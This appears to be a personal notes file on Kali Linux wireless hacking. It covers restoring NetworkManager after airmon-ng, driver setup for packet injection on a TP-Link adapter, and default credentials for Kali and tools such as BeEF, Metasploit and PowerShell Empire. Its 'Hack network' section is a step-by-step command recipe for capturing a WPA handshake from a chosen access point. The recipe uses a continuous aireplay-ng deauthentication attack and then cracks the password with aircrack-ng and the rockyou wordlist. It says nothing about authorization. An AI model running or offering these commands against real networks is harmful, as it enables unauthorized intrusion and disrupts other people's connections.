## Restoring Networkmanager after airmon-ng check kill

I am writing this from (kali-2019.1)

I usually call on airmon-ng like this:

airmon-ng check 

Found 3 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

PID Name
2558 NetworkManager
2573 wpa_supplicant
2575 dhclient

Then "airmon-ng check kill"
Then use: "airmon-ng start wlan0"
Which creates the virtual interface "wlan0mon"

When you are done tinkering in monitor mode, and would like to use managed mode again.

airmon-ng stop wlan0mon (or whatever the virtual interface name is)
service NetworkManager start
service wpa_supplicant start

And you may need to use "ifconfig wlan0 down/up". I have found it really depends on the card in use.

~Hope this helps you out


## Hack network
! See version of Kali
cat /etc/os-release
uname -a

! See interfaces
ip addr
iwconfig

!kill processes
sudo airmon-ng check kill

!Start monitor mode
sudo ifconfig wlan0 down
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
iwconfig  
!or just
sudo airmon-ng start wlan0

!Verify that monitor mode is used
sudo airmon-ng 

!You could also use iwconfig to check that interface is in monitor mode:
iwconfig

! Get the AP's MAC address and channel
sudo airodump-ng wlan0mon

! AP-MAC & channel - you need to select your own here:
ESSID: 90:9A:4A:B8:F3:FB
Channel used by AP for SSID: 2

!1st Window:
!Make sure you replace the channel number and bssid with your own
!Replace hack1 with your file name like capture1 or something 
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon

!2nd Window - deauth attack
!Make sure you replace the bssid with your own
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon

!Use Wireshark to open hack file
wireshark hack1-01.cap
!Filter Wireshark messages for EAPOL
eapol

!Stop monitor mode
airmon-ng stop wlan0mon

!Crack file with Rock you or another wordlist
!Make sure you have rockyou in text format (unzip file on Kali)
!Replace hack1-01.cap with your file name
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 



## TP-Link adapter for WLAN hacking (Monitor mode & packet injection mode) 
#### New updated method is just using $sudo apt install -y realtek-rtl8188eus-dkms
!Use these commands to get the adapter working on Kali for packet injection and monitoring:
!Commands:
```bash
sudo apt update
sudo apt upgrade
sudo apt install bc
sudo apt-get install build-essential 
sudo apt-get install libelf-dev
``` 

Try either of these commands to see which works:
```bash
sudo apt-get install linux-headers-`uname -r`
sudo apt-get install linux-headers-5.10.0-kali6-amd64
```
For Raspberrypi try:
```bash
sudo apt-get install raspberrypi-kernel-headers

sudo apt install dkms
sudo rmmod r8188eu.ko
git clone https://github.com/aircrack-ng/rtl8188eus
cd rtl8188eus
sudo -i
echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf"
exit
sudo reboot
sudo apt update
cd rtl8188eus
sudo make
sudo make install
sudo modprobe 8188eu
```
!To enable Monitor mode and test packet injection:
!=================================================
```bash
sudo ifconfig wlan0 down
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
iwconfig                             
sudo aireplay-ng --test wlan0
```
Source from github
------------------
- https://github.com/c4rb0nx1/Tp-Link-TL-WN722N-in-kali-linux

## Kali's Default Credentials
Kali changed to a non-root user policy by default since the release of 2020.1.

This means:

During the installation of amd64 and i386 images, it will prompt you for a standard user account to be created.
Any default operating system credentials used during Live Boot, or pre-created image (like Virtual Machines & ARM) will be:
User: kali
Password: kali

Vagrant image (based on their policy):
Username: vagrant
Password: vagrant

Amazon EC2:
User: kali
Password: <ssh key>

Default Tool Credentials

Some tools shipped with Kali, will use their own default hardcoded credentials (others will generate a new password the first time its used). The following tools have the default values:
BeEF-XSS
Username: beef
Password: beef
Configuration File: /etc/beef-xss/config.yaml

MySQL
User: root
Password: (blank)
Setup Program: mysql_secure_installation

OpenVAS
Username: admin
Password: <Generated during setup>
Setup Program: openvas-setup

Metasploit-Framework
Username: postgres
Password: postgres
Configuration File: /usr/share/metasploit-framework/config/database.yml

PowerShell-Empire/Starkiller
Username: empireadmin
Password: password123

For versions of Kali Linux older than 2020.1, here is our previous credential information and root policy information.